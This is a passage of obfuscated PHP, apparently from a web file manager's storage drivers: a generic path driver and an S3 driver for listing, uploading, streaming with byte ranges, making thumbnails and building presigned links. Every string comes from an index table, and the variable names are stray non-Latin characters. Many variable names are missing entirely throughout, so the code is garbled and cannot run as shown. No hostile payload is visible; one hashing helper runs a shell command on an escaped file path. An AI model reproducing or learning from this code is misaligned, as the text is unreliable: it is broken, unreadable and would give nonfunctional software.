= array($ȫ[87] => $ډ[$ȫ[87]], $ȫ[78] => $); if (isset($ډ[$ȫ[79]])) { $[$ȫ[79]] = $ډ[$ȫ[79]]; } if (isset($ډ[$ȫ[88]])) { $[$ȫ[88]] = $ډ[$ȫ[88]]; } if (!$) { $[] = $; continue; } $[] = $; $ = $ډ[$ȫ[87]]; $樱 = $this->pathDriver; if (substr($ډ[$ȫ[87]], 0, strlen($樱)) == $樱) { $ = substr($, strlen($樱)); } $this->listAllMake($, $); } } public function listAllSimple($ő, $м׽ = false) { $ʃ = $this->listAll($ő); return $this->listAllSimpleMake($ʃ, $this->getPathOuter($ő), $м׽); } public function listAllSimpleMake($ۗ, $, $ςЭ) { $ =& $_SERVER[ܮ]; $ = array(); $ = rtrim(get_path_father($), $[8]) . $[8]; foreach ($ۗ as $ѓ) { $ = array($[87] => $ѓ[$[87]], $[89] => $ѓ[$[87]], $[78] => $ѓ[$[78]]); if (isset($ѓ[$[79]]) && !$ѓ[$[78]]) { $[$[79]] = $ѓ[$[79]]; } if (isset($ѓ[$[88]])) { $[$[88]] = $ѓ[$[88]]; } if (is_array($ѓ[$[90]])) { $[$[89]] = $ѓ[$[90]][$[87]]; $[$[79]] = $ѓ[$[90]][$[79]]; $[$[88]] = $ѓ[$[90]][$[88]]; } else { if (substr($ѓ[$[87]], 0, strlen($)) == $) { $[$[87]] = substr($ѓ[$[87]], strlen($)); } } $ԯ = $ѓ[$[78]] ? $[8] : $[12]; $[$[89]] = rtrim($[$[89]], $[8]) . $ԯ; $[$[87]] = $[8] . trim($[$[87]], $[8]) . $ԯ; if (!$ςЭ) { $ߩ = explode($[8], trim($[$[87]], $[8])); $[$[87]] = $[8] . implode($[8], array_slice($ߩ, 1)) . $ԯ; } $[] = $; } return array_sort_by($, $[87]); } public function upload($ٜ, $, $ = false, $ = REPEAT_REPLACE) { } public function uploadFileByID($, $̴, $) { } public function uploadFileByPath($, $׭, $ = array()) { } public function isUploadServer() { $뀏 =& $_SERVER[ܮ]; if (isset($this->ioUploadServer) && $this->ioUploadServer == $뀏[91]) { return !0; } return $GLOBALS[$뀏[6]][$뀏[92]][$뀏[93]]; } public function isFileOutServer() { $ =& $_SERVER[ܮ]; if (isset($this->ioFileOutServer) && $this->ioFileOutServer == $[91]) { return !0; } return $GLOBALS[$[6]][$[92]][$[94]]; } public function isCdnHost() { if ($this->isFileOutServer() || empty($this->cdnHost)) { return !1; } return request_url_safe($this->cdnHost) ? !0 : !1; } public function getCdnLink($) { $ =& $_SERVER[ܮ]; if (!$this->isCdnHost()) { return $; } return str_replace(trim(get_url_root($), $[8]), trim($this->cdnHost, $[8]), $); } public function uploadLink($Ș, $ = 0) { $ë =& $_SERVER[ܮ]; if ($this->isUploadServer()) { return; } $ꇐ = $this->getType(); if (!in_array($ꇐ, $this->objectDriver)) { return; } if (!$this->isBucketCors()) { return; } $ = 1024 * 1024 * 10; $ = (!$ ? 1 : ceil($ / pow(1024, 3))) * 3600 * 4; if ($ <= $) { $Ҏ = $this->uploadFormData($Ș, $); } else { $Ҏ = $this->uploadMultiData($Ș, $); } if ($Ҏ) { $Ҏ[$ë[95]] = $Ș; $Ҏ[$ë[96]] = $ꇐ; } return $Ҏ; } public function uploadFormData($, $ƈ = 3600) { } public function uploadMultiData($, $н = 3600) { } public function multiUploadFormData($, $ȍ = 3600) { return $this->uploadMultiData($, $ȍ); } public function download($, $˳) { } public function ext($ў) { return get_path_ext($ў); } public function pathThis($) { $ =& $_SERVER[ܮ]; $ = str_replace($[97], $[8], rtrim($, $[8])); $ٿ = strrpos($, $[8]); if ($ٿ === !1) { return $; } return substr($, $ٿ + 1); } public function pathFather($) { $皪Œ =& $_SERVER[ܮ]; $ = str_replace($皪Œ[97], $皪Œ[8], rtrim($, $皪Œ[8])); $ = strrpos($, $皪Œ[8]); if ($ === !1) { return $皪Œ[12]; } return substr($, 0, $ + 1); } public function hashSimple($) { $ڊ =& $_SERVER[ܮ]; if (!$) { return md5($ڊ[12]); } $䥕 = $this->size($); $־ = 200; $Вԛ = 50; if ($䥕 <= $־ * $Вԛ) { return $this->hashMd5($) . $䥕; } $ڎ = intval($䥕 / $Вԛ); $޸ = $ڊ[12]; for ($ = 0; $ < $Вԛ; $++) { $޸ .= $this->fileSubstr($, $ڎ * $, $־); } $޸ .= $this->fileSubstr($, $䥕 - $־, $־); return md5($޸) . $䥕; } public static $md5Cache = array(); public function hashMd5($) { if (!$) { return md5($_SERVER[ܮ][12]); } $ = $this->iconvSystem($); if (isset(self::$md5Cache[$])) { return self::$md5Cache[$]; } self::$md5Cache[$] = $this->hashMd5Shell($); if (!self::$md5Cache[$]) { self::$md5Cache[$] = @md5_file($); } return self::$md5Cache[$]; } private function hashMd5Shell($Ѿ) { $ =& $_SERVER[ܮ]; if (!$Ѿ) { return md5($[12]); } if (!function_exists($[98])) { return !1; } $閬 = array($[99], $[100]); $ŧ = Cache::get($[101]); if (!$ŧ) { $ҫ = BASIC_PATH . $[102]; $ع = md5_file($ҫ); $ŧ = $[103]; foreach ($閬 as $) { $˚ = shell_exec($ . $[53] . escapeShell($ҫ)); if ($˚ && substr(trim($˚), 0, 32) == $ع) { $ŧ = $; break; } } Cache::set($[101], $ŧ, 3600); } if ($ŧ == $[103]) { return !1; } $˚ = shell_exec($ŧ . $[53] . escapeShell($Ѿ)); $˚ = str_replace($[104], $[12], $˚); return substr($˚, 0, 32); } public function link($) { return $; } public function fileOut($, $ߞ = false, $ɜ = false, $ݥρ = '') { $ =& $_SERVER[ܮ]; $this->cacheMethod(null, null); if (!$ || !$this->exist($)) { show_json(LNG($[105]), !1, $ɜ); } $ = $this->getType() == $[106]; $͉ʊ = $GLOBALS[$[6]][$[92]][$[107]][$[108]]; $Þ = (double) $GLOBALS[$[6]][$[92]][$[107]][$[109]] * 1024 * 1024; @ob_end_clean(); set_timeout(); $ = $this->infoFull($); $ = $[$[79]]; $ = gmdate($[110], $[$[88]]); $Ήɫ = $ɜ ? $ɜ : $this->iconvApp($[$[32]]); $֎ = 0; $ӯ = $ - 1; $ = $this->ext($Ήɫ); if (in_array($, array($[111], $[112], $[113], $[114]))) { $ = $[115]; } if (in_array($, array($[116]))) { $ = $[117]; } if (!$ݥρ) { $ݥρ = md5($ . $); } $ݥρ = $[118] . $ݥρ . $[118]; $ = get_file_mime($); $픺 = !0; $픺 = isset($_GET[$[119]]) ? !1 : !0; if ($ߞ === !1 && !mime_support($)) { $ = $[120]; } header($[121]); header($[122] . $); $ݍ = rawurlencode($Ήɫ); $ݍ = $[118] . $ݍ . $[123] . $ݍ; if ($ߞ) { header($[124]); header($[125] . $ݍ); } else { if ($픺) { header($[126] . $ݍ); } } $  = 3600 * 24 * 30; header($[127]); header($[128]); header($[129] . $ ); header($[130] . gmdate($[110], time() + $ ) . $[131]); if (isset($_SERVER[$[132]]) && strtotime($_SERVER[$[132]]) == $[$[88]]) { header($[133], !0, 304); die; } if (isset($_SERVER[$[134]]) && $_SERVER[$[134]] == $ݥρ) { header($[135] . $ݥρ, !0, 304); die; } header($[135] . $ݥρ); header($[136] . $ . $[131]); header($[137] . rawurlencode($Ήɫ)); header($[138]); header($[139] . $); header($[140]); Hook::trigger($[141], $, $, $Ήɫ, $); if (!$ߞ && $ == $[142]) { if ($ > 1024 * 1024 * 10) { die; } $Ի = $this->getContent($); $Ի = Html::clearSVG($Ի); header($[143] . strlen($Ի)); echo $Ի; die; } $􌄾 = strtolower($_SERVER[$[144]]); if ($ && $􌄾 && $͉ʊ) { if (strstr($􌄾, $[145])) { header($[146] . $); } else { if (strstr($􌄾, $[147])) { header($[148] . $); } else { if (strstr($􌄾, $[149])) { header($[150] . $); } } } if ($Þ) { header($[151] . $Þ); } return; } if (isset($_SERVER[$[152]])) { if (preg_match($[153], $_SERVER[$[152]], $)) { $֎ = intval($[1]); $֎ = $֎ <= 0 ? 0 : ($֎ >= $ӯ ? $ӯ : $֎); if (!empty($[2])) { $Ϧ = intval($[2]); $ӯ = $Ϧ < $֎ ? $֎ : ($Ϧ >= $ӯ ? $ӯ : $Ϧ); } } header($[154]); header("\x43\x6f\x6e\x74\145\156\164\55\x52\141\x6e\x67\x65\x3a\40\x62\x79\x74\145\x73\x20{$֎}\55{$ӯ}\57" . $); } else { header($[155]); } header($[156]); header($[157]); $ = !0; if ($_SERVER[$[158]] == $[159] && $ > 1204 * 1024 * 1024 * 2) { $ = !1; } if ($) { header($[160] . ($ӯ - $֎ + 1)); } if ($_SERVER[$[161]] == $[162]) { return; } $ż = array($[163] => !1, $[164] => $֎, $[165] => $ӯ, $[166] => $, $[167] => $, $[168] => $[12], $[169] => 0); $ż = Hook::filter($[170], $ż); $ = 1024 * 300; $¼ = 0; if ($Þ) { $¼ = intval(1000 * 1000 * ($ / $Þ)); } while ($֎ <= $ӯ) { $ = timeFloat(); check_abort(); $ = $ӯ - $֎ + 1; if ($ <= $) { $ = $; } $Ի = $this->fileSubstr($, $֎, $); if ($ż[$[163]]) { $ż[$[168]] = $Ի; $ż[$[169]] = $֎; $ż = Hook::filter($[171], $ż); $Ի = $ż[$[168]]; } echo $Ի; $֎ += $; if ($ == $) { $֎ = $ӯ + 1; } if ($¼) { $ѫ = intval(1000 * 1000 * (timeFloat() - $)); $׹ = $¼ - $ѫ; if ($׹ > 5) { usleep($׹); } } } } public function fileOutServer($, $ڎ = false, $ = false, $ = '') { $this->fileOut($, $ڎ, $, $); } public function fileOutLink($ɒˎ) { header($_SERVER[ܮ][172] . $ɒˎ); die; } public function cacheMethod($Υޖ, $㳒, $ = null) { $ =& $_SERVER[ܮ]; static $쿙 = array(); $˲ = $㳒 ? ltrim($this->getPathOuter($㳒), $[8]) : $[12]; $ݘڢ = $[173] . $Υޖ . $[174] . rtrim($˲, $[8]); if (is_null($Υޖ)) { $쿙 = array(); return; } if (is_null($㳒)) { foreach ($쿙 as $ݘڢ => $) { if (!strstr($ݘڢ, $[173] . $Υޖ . $[175])) { continue; } unset($쿙[$ݘڢ]); } return; } if ($ === $[176]) { unset($쿙[$ݘڢ]); return; } if (!is_null($)) { $쿙[$ݘڢ] = $; return; } $¾ = isset($쿙[$ݘڢ]) ? $쿙[$ݘڢ] : null; if (!is_null($¾)) { return $¾; } $¾ = $this->{$Υޖ}($㳒); $쿙[$ݘڢ] = $¾; return $¾; } public function cacheMethodInfoSet($, $٧, $镗 = false) { $ =& $_SERVER[ܮ]; if ($this->listItemCache === !1) { return; } $this->cacheMethod($[177], $, $٧); $this->cacheMethod($[178], $, $٧ ? !1 : !0); if (is_array($镗)) { $this->cacheMethod($[179], $, $镗); } } public function fileOutImage($ܑ, $ҋ = 250) { $Р =& $_SERVER[ܮ]; set_timeout(); if (substr($ܑ, 0, 4) == $Р[149]) { $this->fileOutLink($ܑ); } $ɢ = $this->info($ܑ); $ɨ = !1; $ = isset($GLOBALS[$Р[180]]) ? $GLOBALS[$Р[180]] : array(); if ($ && $[$Р[181]] == $ɢ[$Р[87]]) { $ɢ = $; $ = $ɢ[$Р[182]]; if ($ && isset($[$Р[183]])) { if ($[$Р[183]] <= $ҋ && $[$Р[184]] <= $ҋ) { $ɨ = !0; } } } if ($ɢ[$Р[79]] <= 1024 * 50 || $ɨ || !function_exists($Р[185]) || $ɢ[$Р[166]] == $Р[186]) { return $this->fileOut($ܑ, !1, $ɢ[$Р[32]]); } $ַ = kodIO::hashPath($ɢ); $葭 = "\x63\x6f\166\145\162\x5f{$ַ}\x5f{$ҋ}\56\160\156\147"; $у = IO_PATH_SYSTEM_TEMP . $Р[187]; $ = IO::infoFullSimple($у); $ = $ && is_array($) ? $[$Р[87]] : $Р[12]; if (!$) { $ = IO::mkdir($у); } if ($ɢ[$Р[188]] == $Р[189] && isset($ɢ[$Р[190]]) && $ɢ[$Р[190]] == kodIO::sourceID($)) { $ݧ = $ɢ[$Р[191]]; if ($ҋ <= 500) { $̧ى = preg_replace($Р[192], $Р[193], $ɢ[$Р[32]]); $ݧ = IO::fileNameExist($, $̧ى); } return IO::fileOut(KodIO::make($ݧ), !1, $ɢ[$Р[32]]); } $ = IO::fileNameExist($, $葭); if ($) { return IO::fileOut(KodIO::make($), !1, $ɢ[$Р[32]]); } if ($ҋ > 1000) { $this->makeImageCover($, $ܑ, $葭, $ҋ); $this->makeImageCover($, $ܑ, "\143\x6f\x76\x65\162\x5f{$ַ}\x5f\x32\65\x30\56\x70\x6e\x67", 250); $ = IO::fileNameExist($, $葭); if ($) { return IO::fileOut(KodIO::make($), !1, $ɢ[$Р[32]]); } die; } if (!kodIO::allowCover($ɢ)) { return $this->fileOut($ܑ, !1, $ɢ[$Р[32]]); } $ޮ = Cache::get($葭); if ($ޮ == $Р[194] || $ޮ == $Р[195]) { echo $ޮ; die; } Cache::set($葭, $Р[195], 60); $ = array($, $ɢ[$Р[87]], $葭, $ҋ); $Ͻĉ = $Р[196] . $ɢ[$Р[79]] . $Р[197] . $葭 . $Р[198] . $ɢ[$Р[32]] . $Р[199] . $ɢ[$Р[87]]; TaskQueue::add($Р[200], $, $Ͻĉ, $葭); } public function makeImageCover($Ѵ, $ʹ, $, $ϻ) { $墊 =& $_SERVER[ܮ]; if (IO::fileNameExist($Ѵ, $)) { return $墊[201]; } if (!is_dir(DATA_THUMB)) { mk_dir(DATA_THUMB); } if (!is_dir(TEMP_FILES)) { mk_dir(TEMP_FILES); } $ = $this->getPathOuter($ʹ); $ = DATA_THUMB . $; del_file($); $й = IO::copy($, TEMP_FILES, !1, $); if (!@file_exists($й)) { return $墊[202]; } ImageThumb::createThumb($й, $, $ϻ, $ϻ * 10); if (@file_exists($)) { Cache::remove($); return IO::move($, $Ѵ); } Cache::set($, $墊[194], 600); del_file($); return $墊[203] . $й . $墊[74]; } public function fileOutImageServer($, $ौ = 250) { $this->fileOutImage($, $ौ); } public function fileNameAuto($, $֒, $Ͽ = REPEAT_RENAME, $쭅 = false) { $ =& $_SERVER[ܮ]; $˷ = $ === $[12] ? $֒ : rtrim($, $[8]) . $[8] . $֒; if ($Ͽ == REPEAT_REPLACE || !$this->exist($˷) || $쭅 && $Ͽ != REPEAT_RENAME_FOLDER) { return $֒; } if ($Ͽ == REPEAT_SKIP) { return !1; } $ = $[10] . get_path_ext($֒); $ = $ == $[10] || $쭅 ? $[12] : $; $ = 1; $ȴ = substr($֒, 0, strlen($֒) - strlen($)); $ = $ȴ . "\50{$}\51{$}"; while ($this->exist(rtrim($, $[8]) . $[8] . $)) { $ = $ȴ . "\x28{$}\51{$}"; $++; } return $; } private function fileNameAutoList($, $, $ӑ׆ = false) { $ڌ =& $_SERVER[ܮ]; $ = $this->listPath($, !0); $ = array_merge($[$ڌ[85]], $[$ڌ[86]]); $ = array_to_keyvalue($, $ڌ[12], $ڌ[32]); $  = $ڌ[10] . get_path_ext($); $  = $  == $ڌ[10] || $ӑ׆ ? $ڌ[12] : $ ; $Ы₺ = substr($, 0, strlen($) - strlen($ )); $䄫 = $Ы₺ . "\50\60\51{$ }"; for ($ɃШ = 1; $ɃШ <= count($) + 1; $ɃШ++) { $䄫 = $Ы₺ . "\x28{$ɃШ}\51{$ }"; if (!in_array_not_case($䄫, $)) { return $䄫; } } return $䄫; } public function listAllFiles($, $Ɠ) { $뱇 =& $_SERVER[ܮ]; if (empty($Ɠ)) { return array(); } $ = array_keys($Ɠ); $ = array(); $ = trim($, $뱇[8]); foreach ($Ɠ as $Ć => $ٝ) { $̖ = ltrim(substr(trim($Ć, $뱇[8]), strlen($)), $뱇[8]); if (substr($Ć, -1) == $뱇[8]) { $̖ = rtrim($̖, $뱇[8]) . $뱇[8]; } $ = array_merge($, $this->slicePath($̖)); } $Ǳ = array(); foreach (array_unique($) as $) { $ݞ = array($뱇[87] => $this->getPathOuter($뱇[8] . $ . $뱇[8] . $), $뱇[78] => 1, $뱇[79] => 0); if (substr($, -1) != $뱇[8]) { $ݞ[$뱇[78]] = 0; $ = $this->getPath($ . $뱇[8] . $); if (isset($Ɠ[$])) { $ׅ = $Ɠ[$]; if (isset($ׅ[$뱇[79]])) { $ݞ[$뱇[79]] = intval($ׅ[$뱇[79]]); } if (isset($ׅ[$뱇[204]])) { $ݞ[$뱇[88]] = intval($ׅ[$뱇[204]]); } } } $Ǳ[] = $ݞ; } return $Ǳ; } public function slicePath($) { $ =& $_SERVER[ܮ]; $߿ = explode($[8], trim($, $[8])); $ = 0; do { ++$; $Ѡ[] = implode($[8], array_slice($߿, 0, $)) . $[8]; } while ($ < count($߿)); $Ѡ[count($߿) - 1] = $; return $Ѡ; } public function getHost() { $ =& $_SERVER[ܮ]; $ = parse_url(trim($this->domain, $[8])); $ = isset($[$[205]]) ? $[$[205]] : http_type(); $ٴ = isset($[$[206]]) ? $[$[206]] : $[$[87]]; if (isset($[$[207]])) { $ٴ .= $[4] . $[$[207]]; } return $ . $[208] . $ٴ; } public function pathEncode($) { $ =& $_SERVER[ܮ]; return str_replace($[209], $[8], rawurlencode($)); } public function writeLog($ = '', $ = false) { $̨ =& $_SERVER[ܮ]; $²̥ = in_array(ACTION, array($̨[210], $̨[211])); if (!$²̥ && !GLOBAL_DEBUG) { return; } $ = $; static $ܻ = null; if (!$ܻ) { $ܻ = strtoupper($this->getType()); } $ = $ܻ . $̨[212] . $; if ($) { $ߤ = error_get_last(); if ($ߤ) { $ = array($, $ߤ); } } write_log($, $̨[213]); if ($²̥) { throw new Exception($); } } } class PathDriverBaseS3 extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $useSSL = false; protected $region = ''; protected $endpoint = ''; protected $bucket = ''; protected $client = null; protected $signVer = "\x76\x34"; public $ioUploadServer = "\x30"; public $ioFileOutServer = "\60"; public $config = array(); public function __construct($) { set_timeout(); require_once SDK_DIR . $_SERVER[ܮ][214]; parent::__construct(); $this->_init($); } public function _init($ⴋ) { $辁 =& $_SERVER[ܮ]; $this->config = $ⴋ; foreach ($ⴋ as $ڎ => $㨟) { if (isset($this->{$ڎ})) { $this->{$ڎ} = $㨟; } } $this->endpoint = $ⴋ[$辁[215]]; $this->client = new S3($this->accessKey, $this->secret, $this->useSSL, $this->endpoint, $this->region); $ = $this->getHost(); if (!get_url_scheme($this->endpoint) && substr($, 0, 7) == $辁[216]) { $ = $辁[217] . substr($, 7); } $this->client->setEndpoint($); if (in_array(ACTION, array($辁[210], $辁[211]))) { $this->client->setExceptions(); } } public function setSignVersion($ = "\166\x34") { $this->signVer = $; $this->client->setSignVersion($); } public function setBucketCors() { return $this->client->setBucketCors($this->bucket); } public function getBucketCors() { try { return $this->client->getBucketCors($this->bucket); } catch (Exception $ٚҕ) { return null; } } public function isBucketCors() { $ݕ =& $_SERVER[ܮ]; $Ά = $this->getBucketCors(); if (!$Ά || !is_array($Ά)) { return !1; } if (!is_array($Ά[$ݕ[218]])) { $Ά[$ݕ[218]] = explode($ݕ[50], $Ά[$ݕ[218]]); } if ($Ά[$ݕ[219]] != $ݕ[220] || !in_array($ݕ[220], $Ά[$ݕ[218]])) { return !1; } $ = array_map($ݕ[221], $Ά[$ݕ[222]]); if (!is_array($)) { $ = array(); } $ = array($ݕ[223], $ݕ[224], $ݕ[225], $ݕ[226], $ݕ[227]); $ = array_diff($, $); return empty($); } public function getBktRegion() { return $this->client->getBucketRegion($this->bucket); } public function setRegion($ր) { return $this->client->setRegion($ր); } public function mkfile($߯։, $ߟ = '', $ = REPEAT_RENAME) { $ۧ = $this->setContent($߯։, $ߟ); if ($ۧ !== !1) { return $this->getPathOuter($߯։); } return !1; } public function mkdir($Ǳ, $չ = REPEAT_SKIP) { $Ѭݗ =& $_SERVER[ܮ]; if (empty($Ǳ) && $Ǳ !== $Ѭݗ[228]) { return !1; } if ($չ && $this->_isFolder($Ǳ)) { return $this->getPathOuter($Ǳ); } $ = $this->setContent($Ǳ, $Ѭݗ[12], !0); if ($ !== !1) { return $this->getPathOuter($Ǳ); } return !1; } public function copyFile($׃, $߀, $̨Õ = array()) { $旸 =& $_SERVER[ܮ]; $ = $this->objectMeta($׃); if (!$) { return !1; } if ($[$旸[79]] <= 1024 * 1024 * 200) { $ = $this->client->copyObject($this->bucket, $׃, $this->bucket, $߀, $旸[229], $̨Õ); } else { $ = $this->client->multiCopyObject($this->bucket, $׃, $this->bucket, $߀, $̨Õ); } $ = $ ? $this->getPathOuter($߀) : !1; return $; } public function moveFile($, $ځ) { if ($this->copyFile($, $ځ)) { $this->delFile($); return $this->getPathOuter($ځ); } return !1; } public function delFile($ӈ) { return $this->client->deleteObject($this->bucket, $ӈ); } public function delFolder($) { $ھ =& $_SERVER[ܮ]; if (!$this->exist($)) { return !0; } $this->listItemCache = !1; $ށ = $this->fileList($); $this->listItemCache = !0; $Ƞڇ = trim($, $ھ[8]) . $ھ[8]; if (!empty($) && $ !== $ھ[228] && !in_array($Ƞڇ, $ށ[$ھ[85]])) { $ށ[$ھ[85]][] = $Ƞڇ; } $ꭢ = $this->delByBatch($ށ[$ھ[86]]); if (!$ꭢ) { return !1; } $ꭢ = $this->delByBatch($ށ[$ھ[85]]); if (!$ꭢ) { return !1; } return $this->delFile($Ƞڇ); } private function delByBatch($) { foreach (array_chunk($, 1000) as $) { $ = $this->client->deleteObjects($this->bucket, $); if (!$) { return !1; } } return !0; } public function rename($, $䪈) { return $this->renameObject($, $䪈); } public function listPath($ǖԒ, $ = false) { $Ɩ =& $_SERVER[ܮ]; $폷צ = $this->fileList($ǖԒ, $Ɩ[8], !0); foreach ($폷צ[$Ɩ[85]] as $ => $) { $폷צ[$Ɩ[85]][$] = $this->folderInfo($, $, $); } foreach ($폷צ[$Ɩ[86]] as $ => $) { $폷צ[$Ɩ[86]][$] = $this->fileInfo($[$Ɩ[32]], $, $); } return $폷צ; } protected function infoChildren($쀪, &$ē) { $÷ =& $_SERVER[ܮ]; $ = $this->fileList($쀪, $÷[12], !0); $ē[$÷[81]] += count($[$÷[85]]); $ē[$÷[80]] += count($[$÷[86]]); foreach ($[$÷[86]] as $ңш) { if (!$ңш || !$ңш[$÷[79]]) { continue; } $ē[$÷[79]] += $ңш[$÷[79]]; } } private function fileInfo($εù, $␦ = false, $ = array()) { $ғƾ =& $_SERVER[ܮ]; $Ҹ = array($ғƾ[32] => $this->pathThis($εù), $ғƾ[87] => $this->getPathOuter($εù), $ғƾ[33] => $ғƾ[230], $ғƾ[166] => $this->ext($εù), $ғƾ[79] => isset($[$ғƾ[79]]) ? $[$ғƾ[79]] : 0); if ($␦) { return $Ҹ; } $Ҹ[$ғƾ[231]] = $Ҹ[$ғƾ[88]] = 0; $Ҹ[$ғƾ[232]] = $Ҹ[$ғƾ[233]] = !0; if (empty($)) { $ = $this->objectMeta($εù); if (!$) { return $Ҹ; } } if (isset($[$ғƾ[234]]) && $[$ғƾ[234]]) { $Ҹ[$ғƾ[235]] = $[$ғƾ[234]]; } if (isset($[$ғƾ[204]])) { $Ҹ[$ғƾ[88]] = $[$ғƾ[204]]; } if (isset($[$ғƾ[79]])) { $Ҹ[$ғƾ[79]] = $[$ғƾ[79]]; } return $Ҹ; } private function folderInfo($σ, $ɬ = false, $ý = array()) { $낺 =& $_SERVER[ܮ]; $Є = array($낺[32] => $this->pathThis($σ), $낺[87] => $this->getPathOuter($낺[8] . $σ), $낺[33] => $낺[78]); if ($ɬ) { return $Є; } $Є[$낺[231]] = $Є[$낺[88]] = 0; $Є[$낺[232]] = $Є[$낺[233]] = !0; if ($σ == $낺[12]) { return $Є; } if (empty($ý)) { $ý = $this->objectMeta(trim($σ, $낺[8]) . $낺[8]); } if (isset($ý[$낺[204]])) { $Є[$낺[231]] = $ý[$낺[204]]; } return $Є; } private function fileList($, $ӌ = '', $ǓǱ = 0) { $ =& $_SERVER[ܮ]; $ܐ = rtrim($, $[8]) . $[8]; $ݦ = $this->listObjs($ܐ, null, null, $ӌ); if (!$ݦ) { return array($[85] => array(), $[86] => array()); } $ = $ = array(); foreach ($ݦ[$[236]] as $ʅ) { $ = $ʅ[$[32]]; if ($ == $ܐ) { continue; } $ = isset($ʅ[$[79]]) ? $ʅ[$[79]] : 0; $ע = $ == 0 && substr($, strlen($) - 1, 1) == $[8] ? !0 : !1; $this->cacheMethodInfoSet($, $ע, $ʅ); if ($ע) { $[] = $; continue; } $[] = $ǓǱ ? $ʅ : $; } foreach ($ݦ[$[237]] as $ʅ) { $[] = $ʅ[$[32]]; $this->cacheMethodInfoSet($ʅ[$[32]], !0); } $this->cacheMethodInfoSet($, !0); return array($[85] => $, $[86] => $); } private function listObjs($, $䶋 = null, $ = null, $Ɠ = null) { $ =& $_SERVER[ܮ]; $ = trim($, $[8]); $կǽ = empty($) && $ !== $[228] ? $[12] : $ . $[8]; return $this->client->getBucket($this->bucket, $կǽ, $䶋, $, $Ɠ, !0); } public function has($, $˺˲ = false, $ˣ = true) { $ዳ =& $_SERVER[ܮ]; $ = trim($, $ዳ[8]); $հخ = empty($) && $ !== $ዳ[228] ? $ዳ[12] : $ . $ዳ[8]; $֌Ϲ = null; $ = 500; $ɗ = $ዳ[8]; $Ǳ = $ = array(); while (!0) { $ = $this->listObjs($, $֌Ϲ, $, $ɗ); if (!$) { break; } $֌Ϲ = $[$ዳ[238]]; $퇓 = $[$ዳ[236]]; $ = $[$ዳ[237]]; if (empty($퇓) && empty($)) { break; } if (count($퇓) == 1 && $퇓[0][$ዳ[32]] == $հخ) { break; } if ($˺˲) { if (count($퇓)) { $퇓 = array_column($퇓, $ዳ[32]); $Ǳ = array_merge($Ǳ, $퇓); } if (count($)) { $ = array_column($, $ዳ[32]); $ = array_merge($, $); } if ($֌Ϲ === null) { break; } continue; } if ($ˣ) { if (!empty($퇓)) { if (count($퇓) > 1 || isset($퇓[0][$ዳ[32]]) && $퇓[0][$ዳ[32]] != $հخ) { return !0; } } } else { if (!empty($)) { return !0; } } if ($֌Ϲ === null) { break; } } if ($˺˲) { $Ǳ = array_diff($Ǳ, array($հخ)); $Ǳ = count(array_unique($Ǳ)); $ = count(array_unique($)); return array($ዳ[239] => $Ǳ, $ዳ[240] => $); } return !1; } public function listAll($) { $ =& $_SERVER[ܮ]; $Ņ = $this->fileList($, $[12], !0); $Ư = array_to_keyvalue($Ņ[$[86]], $[32]); foreach ($Ņ[$[85]] as $Ԩʤ) { if (is_string($Ԩʤ)) { $Ư[$Ԩʤ] = array($[79] => 0); } } return $this->listAllFiles($, $Ư); } public function canRead($ܭ) { $ȫ =& $_SERVER[ܮ]; $ = $this->client->getAccessControlPolicy($this->bucket, $ܭ); if (!$) { return !1; } return in_array($, array($ȫ[241], $ȫ[242], $ȫ[243])) ? !0 : !1; } public function canWrite($) { $ߪ =& $_SERVER[ܮ]; $̾ = $this->client->getAccessControlPolicy($this->bucket, $); if (!$̾) { return !1; } return in_array($̾, array($ߪ[241], $ߪ[242])) ? !0 : !1; } public function getContent($֎) { return $this->client->getObject($this->bucket, $֎); } public function setContent($ّ, $ = '', $۾ߐ = false) { $鹻 =& $_SERVER[ܮ]; $ّ = $۾ߐ ? trim($ّ, $鹻[8]) . $鹻[8] : $ّ; $Ȩ = get_file_mime(get_path_ext($ّ)); $ī = $this->client->putObject($, $this->bucket, $ّ, $鹻[229], array(), $Ȩ); if (!$ī) { return !1; } if ($۾ߐ) { return !0; } return $ī ? !0 : !1; } public function fileSubstr($ڏ, $ڭۑ, $) { $ = $ڭۑ + $ - 1; return $this->client->getObject($this->bucket, $ڏ, array($_SERVER[ܮ][244] => "\142\x79\164\x65\163\x3d{$ڭۑ}\55{$}")); } public function upload($޹, $ᆮ, $³ = false, $ = REPEAT_REPLACE) { $ͺ佞 =& $_SERVER[ܮ]; if (!$ᆮ || !@file_exists($ᆮ)) { return !1; } $ = array($ͺ佞[245] => @md5_file($ᆮ)); $ = array($ͺ佞[246] => get_file_mime(get_path_ext($޹))); if (IO::size($ᆮ) <= 1024 * 1024 * 200) { $ = $this->client->putObjectFile($ᆮ, $this->bucket, $޹, $ͺ佞[229], $, $); return !empty($) ? $this->getPathOuter($޹) : !1; } $հ = $this->client->multiUploadObject($ᆮ, $this->bucket, trim($޹, $ͺ佞[8]), $, $); return $հ ? $this->getPathOuter($޹) : !1; } public function download($ذ, $Å¡) { if (!@is_dir($this->pathFather($Å¡)) && !IO::mkdir($this->pathFather($Å¡))) { return !1; } $ڸ = $this->client->getObject($this->bucket, $ذ, array(), $Å¡); return $ڸ !== !1 ? $Å¡ : !1; } public function link($, $ = array()) { return $this->getPreSignedURL($, 3600 * 12, $); } private function getPreSignedURL($, $, $󭫙 = array(), $ڍ = "\107\x45\124") { $ =& $_SERVER[ܮ]; $ = trim($, $[8]); if ($this->signVer == $[247]) { return $this->client->getPreSignedV2URL($this->bucket, $, $, $ڍ, $󭫙); } return $this->client->getPreSignedV4URL($this->bucket, $, $, array(), $ڍ, $󭫙); } public function fileOut($, $ = false, $傴䅫 = false, $჎ = '') { $ =& $_SERVER[ܮ]; if ($this->isFileOutServer()) { return $this->fileOutServer($, $, $傴䅫, $჎); } if (!$傴䅫) { $傴䅫 = $this->pathThis($); } $ = get_file_mime(get_path_ext($傴䅫)); if ($ == $[248]) { return parent::fileOut($, $, $傴䅫, $჎); } $ʔӦ = array($[249] => $); if ($) { $ʔӦ[$[250]] = $[251] . rawurlencode($傴䅫); } else { } $˕ = $this->link($, $ʔӦ); $this->fileOutLink($˕); } public function fileOutServer($ֿ, $ň = false, $ɺ = false, $߈ = '') { parent::fileOut($ֿ, $ň, $ɺ, $߈); } public function fileOutImageServer($٫, $֭ = 250) { parent::fileOutImage($٫, $֭); } public function fileOutLink($٥) { $݅ߌ =& $_SERVER[ܮ]; if (!isset($this->osType)) { $this->osType = $this->getType(); } if (!in_array($this->osType, array($݅ߌ[67], $݅ߌ[66], $݅ߌ[68])) && 